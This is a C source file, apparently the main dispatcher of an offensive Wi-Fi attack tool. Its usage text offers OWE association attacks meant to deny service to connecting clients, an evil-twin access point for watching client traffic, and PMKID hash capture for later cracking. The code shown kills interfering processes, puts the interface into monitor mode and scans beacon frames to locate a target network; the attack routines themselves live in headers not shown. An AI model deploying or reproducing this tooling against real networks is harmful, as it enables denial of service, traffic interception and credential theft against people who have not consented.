#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <time.h>

#include "helper.h"
#include "owe_attacks.h"
#include "pmkid_attack.h"
#include "twin_ap_attack.h"


static uint8_t *get_interface_mac(int raw_socket, struct ifreq *ifr);

//set interface to monitor mode. Return value of -1 indicates failure. 0 indicated success
//if interface is already monitor mode, does nothing
static int set_interface_mode_monitor(int raw_socket, struct ifreq *ifr, int channel);

//set interface up/down. -1 indicates failure. 0 indicates success
static int set_interface_status(int raw_socket, struct ifreq *ifr, bool up);

//set interface channel
static int set_interface_channel(int raw_socket, struct iwreq iwr, int channel);

//for finding bssid and channel of given ssid
void find_ap_info(const char *target_ssid, uint8_t *ap_mac, int *ap_channel, const char *intf, int raw_socket);


int main(int argc, char *argv[])
{

    if (argc < 2)
    {
        printf("Usage: %s [attack] <attack parameters>\n\n", argv[0]);
        printf("Possible attacks:\n");
        printf("\towe_asso_resp_replay <mon_interface> <ssid>      Used to DOS connecting clients\n");
        printf("\towe_asso_resp_code <mon_interface> <ssid>        Used to DOS connecting clients\n");
        printf("\towe_asso_req <mon_interface> <ssid>              Used to DOS connecting clients\n");
        printf("\ttwin_ap                                          Can be used to monitor traffic from clients\n");
        printf("\tpmkid <mon_interface> <mng_interface> <ssid>     Can be used to capture PMKID hashes from WPA-2 networks and later crack them\n");
        exit(-1);
    }

    if (strcmp(argv[1], "twin_ap") == 0)
    {
        twin_ap_attack();
    }

    else
    { 
    
    int ap_channel = 1; //default channel for setup
    uint8_t *ap_mac = malloc(MAC_LEN);

    char *ap_ssid = NULL;


    if (strcmp(argv[1], "pmkid") == 0)
        ap_ssid = argv[4];
    else
        ap_ssid = argv[3];


    intf_info intf_info = {.name = argv[2], .mac = NULL};


    int intf_mode;

    struct ifreq ifr;
    struct sockaddr_ll ll;
    int raw_socket;


    //Kill interfering processes
    system("airmon-ng check kill");

    raw_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (raw_socket < 0)
    {
        printf("[-] Error declaring the raw socket!\n");
        return 1;
    }

    printf("[+] Succesfully defined raw socket!\n");
    
    strncpy(ifr.ifr_name, intf_info.name, sizeof(ifr.ifr_name));

    //this ioctl call gets interfaces index, but it can also be used to verify existance of interface
    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0)
    {
        printf("[-] Couldn't find interface with name %s\n", intf_info.name);
        exit(-1);
    }

    ll.sll_ifindex = ifr.ifr_ifindex;
    ll.sll_protocol = htons(ETH_P_ALL);
    ll.sll_family = PF_PACKET;

    intf_info.mac = get_interface_mac(raw_socket, &ifr);
    if (intf_info.mac == NULL)
    {
        printf("[-] Error retrieving interface mac address\n");
        exit(-1);
    }

    if (set_interface_mode_monitor(raw_socket, &ifr, ap_channel) < 0)
    {
        printf("[-] Failed while setting the interface to monitor mode\n");
        exit(-1);
    }

    if (bind(raw_socket, (struct sockaddr *)&ll, sizeof(ll)) < 0)
    {
        printf("[-] Failed to bind!\n");
        return 2;
    }

    printf("[+] Successfully binded!\n");

    find_ap_info(ap_ssid, ap_mac, &ap_channel, argv[2],raw_socket);

    ap_info ap_info = {.ssid = ap_ssid};
    memcpy(ap_info.mac, ap_mac, MAC_LEN);

    set_interface_mode_monitor(raw_socket, &ifr, ap_channel);


    if (strcmp(argv[1], "owe_asso_resp_replay") == 0)
        owe_asso_resp_replay_attack(raw_socket, &ap_info, &intf_info);

    else if (strcmp(argv[1], "owe_asso_resp_code") == 0)
        owe_asso_resp_code_attack(raw_socket, &ap_info, &intf_info);

    else if (strcmp(argv[1], "owe_asso_req") == 0)
        owe_asso_req_attack(raw_socket, &ap_info);

    else if (strcmp(argv[1], "pmkid") == 0)
        pmkid_attack(argv[2], argv[3], argv[4]);

    else
        printf("[-] Invalid attack name!");
    return 0;
    }
}


static uint8_t *get_interface_mac(int raw_socket, struct ifreq *ifr)
{
    if (ioctl(raw_socket, SIOCGIFHWADDR, ifr) < 0) {
        return NULL;
    }
    uint8_t *mac_buffer = malloc(MAC_LEN);
    memcpy(mac_buffer, ifr->ifr_hwaddr.sa_data, 6);
    return mac_buffer;
}

static int set_interface_mode_monitor(int raw_socket, struct ifreq *ifr, int channel)
{
    struct iwreq iwr;
    strncpy(iwr.ifr_name, ifr->ifr_name, IFNAMSIZ);

    if (ioctl(raw_socket, SIOCGIWMODE, &iwr) < 0)
    {
        printf("[-] Error retrieving interface mode\n");
        return -1;
    }
    
    if (iwr.u.mode != IW_MODE_MONITOR)
    {
        printf("[ ] Setting the interface to monitor mode\n");
        iwr.u.mode = IW_MODE_MONITOR;
    } else
    {
        //interface already is monitor mode.
        if (set_interface_channel(raw_socket, iwr, channel) < 0)
            return -1;
        return 0; //interface already is monitor mode.
    }


    //set interface down
    if (set_interface_status(raw_socket, ifr, false) < 0)
        return -1;


    if (ioctl(raw_socket, SIOCSIWMODE, &iwr) < 0)
    {
        printf("[-] Error setting the interface to monitor mode\n");
        return -1;
    }

    if (set_interface_channel(raw_socket, iwr, channel) < 0)
            return -1;

    //set interface up
    if (set_interface_status(raw_socket, ifr, true) < 0)
        return -1;


    printf("[+] Successfully set the interface to monitor mode\n");
    return 0;
}

static int set_interface_status(int raw_socket, struct ifreq *ifr, bool up)
{
    //Get current flags
    if (ioctl(raw_socket, SIOCGIFFLAGS, ifr) < 0)
    {
        printf("[-] Error getting interface flags\n");
        return -1;
    }

    if (up)
        ifr->ifr_flags |= IFF_UP;
    else
        ifr->ifr_flags &= ~IFF_UP;

    //Set flags
    if (ioctl(raw_socket, SIOCSIFFLAGS, ifr) < 0)
    {
        printf("[-] Error setting interface flags\n");
        return -1;
    }
    return 0;
}

static int set_interface_channel(int raw_socket, struct iwreq iwr, int channel)
{
    iwr.u.freq.m = channel;
    iwr.u.freq.e = 0;
    
    if (ioctl(raw_socket, SIOCSIWFREQ, &iwr) < 0) {
        printf("[-] Error setting the interface to channel %d\n", channel);
        return -1;
    }

    printf("[+] Successfully set the interface to channel %d\n", channel);

    return 0;
}

void find_ap_info(const char *target_ssid, uint8_t *ap_mac, int *ap_channel, const char *intf, int raw_socket) 
{
    struct iwreq iwr;
    
    // Verify interface is in monitor mode
    strncpy(iwr.ifr_name, intf, IFNAMSIZ);
    if (ioctl(raw_socket, SIOCGIWMODE, &iwr) < 0) {
        printf("[-] Error getting interface mode. Is %s a wireless interface?\n", intf);
        close(raw_socket);
        return;
    }
    
    if (iwr.u.mode != IW_MODE_MONITOR) {
        printf("[-] Interface %s is not in monitor mode\n", intf);
        close(raw_socket);
        return;
    }
    
    printf("[+] Starting scan for SSID: %s\n", target_ssid);
    
    // Buffer to receive 802.11 frames
    uint8_t buffer[2048];
    
    // Set a timeout for the scan (1 seconds)
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(raw_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    bool found = false;
    time_t start_time = time(NULL);
    time_t current_time;
    
    // Loop through all available channels
    for (int curr_channel = 1; curr_channel <= 11 && !found; curr_channel++) {
        // Set interface to current channel
        iwr.u.freq.m = curr_channel;
        iwr.u.freq.e = 0;
        
        if (ioctl(raw_socket, SIOCSIWFREQ, &iwr) < 0) {
            printf("[-] Error setting channel %d\n", curr_channel);
            continue;
        }
        
        // Listen for packets on this channel for 1 second
        time_t channel_start = time(NULL);
        
        while ((time(NULL) - channel_start) < 1 && !found) {
            int bytes_received = recv(raw_socket, buffer, sizeof(buffer), 0);
            
            if (bytes_received <= 0) {
                continue;
            }
            
            // Skip radiotap header
            int radiotap_header_length = buffer[2]; // Radiotap header length at offset 2
            
            if (bytes_received < radiotap_header_length + 24) {
                // Packet too small to be a beacon frame
                continue;
            }
            
            uint8_t *ieee80211_header = buffer + radiotap_header_length;
            
            // Check if this is a beacon frame (type 0, subtype 8)
            // Frame control field is the first 2 bytes of the 802.11 header
            uint16_t frame_control = ieee80211_header[0] | (ieee80211_header[1] << 8);
            
            if ((frame_control & 0x00FC) != 0x0080) { // Not a beacon frame
                continue;
            }
            
            // Extract the BSSID from the beacon frame (address 3)
            uint8_t *bssid = ieee80211_header + 16;
            
            // Skip 802.11 header (24 bytes) to get to the beacon frame body
            uint8_t *beacon_body = ieee80211_header + 24;
            int beacon_body_length = bytes_received - radiotap_header_length - 24;
            
            // The first 12 bytes of the beacon body are fixed parameters
            // After that come the variable-length information elements
            uint8_t *information_elements = beacon_body + 12;
            int ie_length = beacon_body_length - 12;
            
            // Parse information elements to find SSID
            // Parse information elements to find SSID
            int offset = 0;
            while (offset < ie_length - 2) {
                uint8_t element_id = information_elements[offset];
                uint8_t element_length = information_elements[offset + 1];
                
                if (offset + 2 + element_length > ie_length) {
                    break; // Avoid buffer overflow
                }
                
                // Element ID 0 is SSID
                if (element_id == 0 && element_length > 0) {
                    // Check if SSID matches our target
                    if (element_length == strlen(target_ssid) && 
                        memcmp(&information_elements[offset + 2], target_ssid, element_length) == 0) {
                        
                        // Found matching SSID! Now look for the channel in the information elements
                        int channel_found = 0;
                        int ie_offset = 0;
                        
                        // Reset to beginning of information elements to find channel
                        while (ie_offset < ie_length - 2) {
                            uint8_t ie_id = information_elements[ie_offset];
                            uint8_t ie_len = information_elements[ie_offset + 1];
                            
                            if (ie_offset + 2 + ie_len > ie_length) {
                                break; // Avoid buffer overflow
                            }
                            
                            // Element ID 3 is DS Parameter Set (contains channel)
                            if (ie_id == 3 && ie_len == 1) {
                                *ap_channel = information_elements[ie_offset + 2];
                                channel_found = 1;
                                break;
                            }
                            
                            // Move to the next information element
                            ie_offset += 2 + ie_len;
                        }
                        
                        // If channel not found in information elements, use current channel
                        if (!channel_found) {
                            *ap_channel = curr_channel;
                        }
                        
                        // Store the BSSID
                        memcpy(ap_mac, bssid, MAC_LEN);
                        
                        printf("[+] Found matching AP!\n");
                        printf("[+] SSID: %s\n", target_ssid);
                        printf("[+] BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n",
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                        printf("[+] Channel: %d\n", *ap_channel);
                        found = true;
                        break;
                    }
                }
                
                // Move to the next information element
                offset += 2 + element_length;
            }
        }
        
        // Check if we've spent too much time scanning
        current_time = time(NULL);
        if (current_time - start_time > 30) {
            printf("[-] Scan timeout reached\n");
            break;
        }
    }
    
    if (!found) {
        printf("[-] Could not find AP with SSID: %s\n", target_ssid);
    }
}
